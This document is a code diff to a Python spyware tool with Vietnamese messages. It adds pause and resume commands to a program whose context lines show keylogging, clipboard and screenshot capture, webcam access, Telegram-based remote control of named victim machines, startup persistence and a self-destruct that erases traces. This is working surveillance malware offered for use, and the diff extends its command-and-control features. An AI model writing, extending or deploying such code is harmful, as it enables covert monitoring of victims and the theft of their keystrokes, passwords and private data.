@@ -30,6 +30,7 @@ DEBUG_LOG = os.path.join(STORAGE, 'debug.log')
 last_clipboard = ""
 state_lock = Lock()
 session_start_time = datetime.now()
+IS_PAUSED = False
 
 if not os.path.exists(STORAGE):
     try:
@@ -58,7 +59,8 @@ def load_state():
         "screenshot_interval": 30,
         "keylog_send_interval": 120,
         "outbox_retry_interval": 60,
-        "machine_name": ""
+        "machine_name": "",
+        "paused": False
     }
     with state_lock:
         if os.path.exists(STATE_PATH):
@@ -95,7 +97,7 @@ def save_state(state):
         except Exception as e:
             log_message(f"Error saving state: {e}")
 
-def update_state(last_screenshot_sent=None, last_keylog_sent=None, last_outbox_retry=None, telegram_offset=None, screenshot_interval=None, keylog_send_interval=None, outbox_retry_interval=None, machine_name=None):
+def update_state(last_screenshot_sent=None, last_keylog_sent=None, last_outbox_retry=None, telegram_offset=None, screenshot_interval=None, keylog_send_interval=None, outbox_retry_interval=None, machine_name=None, paused=None):
     state = load_state()
     if last_screenshot_sent:
         state["last_screenshot_sent"] = last_screenshot_sent
@@ -113,6 +115,8 @@ def update_state(last_screenshot_sent=None, last_keylog_sent=None, last_outbox_r
         state["outbox_retry_interval"] = outbox_retry_interval
     if machine_name is not None:
         state["machine_name"] = machine_name
+    if paused is not None:
+        state["paused"] = paused
     save_state(state)
 
 def process_keylog_text(raw_text):
@@ -444,13 +448,14 @@ def screen_thread_func():
     last_capture = datetime.min
     while True:
         try:
-            if datetime.now() - last_capture >= timedelta(seconds=SCREENSHOT_INTERVAL):
-                current_time = datetime.now().strftime("%Y%m%d_%H%M%S")
-                screenshot_path = os.path.join(SCREENSHOT_DIR, f"screenshot_{current_time}.png")
-                with mss.MSS() as sct:
-                    sct.shot(output=screenshot_path)
-                last_capture = datetime.now()
-                log_message(f"Captured screenshot: {os.path.basename(screenshot_path)}")
+            if not IS_PAUSED:
+                if datetime.now() - last_capture >= timedelta(seconds=SCREENSHOT_INTERVAL):
+                    current_time = datetime.now().strftime("%Y%m%d_%H%M%S")
+                    screenshot_path = os.path.join(SCREENSHOT_DIR, f"screenshot_{current_time}.png")
+                    with mss.MSS() as sct:
+                        sct.shot(output=screenshot_path)
+                    last_capture = datetime.now()
+                    log_message(f"Captured screenshot: {os.path.basename(screenshot_path)}")
         except Exception as e:
             log_message(f"Error in ScreenThread: {e}")
         time.sleep(5)  # Small sleeping period for lightweight polling
@@ -510,6 +515,8 @@ def take_webcam():
         return None
 
 def check_clipboard_async():
+    if IS_PAUSED:
+        return
     global last_clipboard
     time.sleep(0.25)  # Wait for clipboard to update in OS
     clipboard_content = get_clipboard()
@@ -530,6 +537,8 @@ def check_clipboard_async():
             log_message(f"Error saving clipboard content to buffer: {e}")
 
 def on_press(key):
+    if IS_PAUSED:
+        return
     global last_clipboard
     try:
         key_str = str(key)
@@ -773,6 +782,7 @@ def self_destruct():
         send_telegram_message(f"❌ Lỗi tự hủy: {e}")
 
 def execute_command(command, message=None):
+    global IS_PAUSED
     raw_cmd = command.strip()
     
     # Check for target machine identifier (e.g. @Laptop-A)
@@ -815,6 +825,10 @@ def execute_command(command, message=None):
         state = load_state()
         machine = state.get("machine_name") or os.environ.get('COMPUTERNAME', 'Unknown-PC')
         my_name = machine.lower()
+        
+        status_str = "⏸️ Đang tạm dừng" if IS_PAUSED else "🟢 Đang hoạt động"
+        pause_btn = {"text": "▶️ Tiếp tục", "callback_data": f"resume @{my_name}"} if IS_PAUSED else {"text": "⏸️ Tạm dừng", "callback_data": f"pause @{my_name}"}
+        
         inline_kb = {
             "inline_keyboard": [
                 [
@@ -826,13 +840,16 @@ def execute_command(command, message=None):
                     {"text": "⏱️ Intervals", "callback_data": f"interval @{my_name}"}
                 ],
                 [
-                    {"text": "🏷️ Đổi tên", "callback_data": f"name @{my_name}"},
+                    pause_btn,
+                    {"text": "🏷️ Đổi tên", "callback_data": f"name @{my_name}"}
+                ],
+                [
                     {"text": "💥 Tự hủy", "callback_data": f"destruct @{my_name}"}
                 ]
             ]
         }
         send_telegram_message(
-            f"<b>✅ Trạng thái [{machine}]</b>\nHoạt động\nThời gian chạy: {datetime.now() - session_start_time}",
+            f"<b>✅ Trạng thái [{machine}]</b>\n{status_str}\nThời gian chạy: {datetime.now() - session_start_time}",
             reply_markup=inline_kb
         )
 
@@ -899,6 +916,16 @@ def execute_command(command, message=None):
                 update_state(machine_name=new_name)
                 send_telegram_message(f"✅ Đã đổi tên máy thành: <code>{new_name}</code>")
 
+    elif cmd in ["/pause", "pause"]:
+        IS_PAUSED = True
+        update_state(paused=True)
+        send_telegram_message("⏸️ Đã tạm dừng hoạt động giám sát (keylog, chụp màn hình).")
+
+    elif cmd in ["/resume", "resume"]:
+        IS_PAUSED = False
+        update_state(paused=False)
+        send_telegram_message("▶️ Đã tiếp tục hoạt động giám sát.")
+
     elif cmd in ["/destruct", "destruct", "/selfdestruct", "selfdestruct"]:
         self_destruct()
     
@@ -911,6 +938,8 @@ def execute_command(command, message=None):
             "/status - Trạng thái\n"
             "/interval - Cấu hình thời gian gửi/chụp\n"
             "/name - Xem/Đặt tên cho máy\n"
+            "/pause - Tạm dừng giám sát\n"
+            "/resume - Tiếp tục giám sát\n"
             "/destruct - Tự hủy tool và xóa dấu vết\n"
             "/help - Danh sách lệnh"
         )
@@ -985,12 +1014,13 @@ def add_to_startup(force=False):
         return False
 
 def main():
-    global SCREENSHOT_INTERVAL, KEYLOG_SEND_INTERVAL, OUTBOX_RETRY_INTERVAL
+    global SCREENSHOT_INTERVAL, KEYLOG_SEND_INTERVAL, OUTBOX_RETRY_INTERVAL, IS_PAUSED
     try:
         state = load_state()
         SCREENSHOT_INTERVAL = state.get("screenshot_interval", 30)
         KEYLOG_SEND_INTERVAL = state.get("keylog_send_interval", 120)
         OUTBOX_RETRY_INTERVAL = state.get("outbox_retry_interval", 60)
+        IS_PAUSED = state.get("paused", False)
     except Exception as e:
         log_message(f"Error loading initial intervals: {e}")
 
@@ -1030,6 +1060,9 @@ def main():
     while True:
         time.sleep(5)  # Small sleeping period for lightweight polling
         
+        if IS_PAUSED:
+            continue
+            
         state = load_state()
         
         # 1. Read and flush keylogs based on last_keylog_sent timestamp
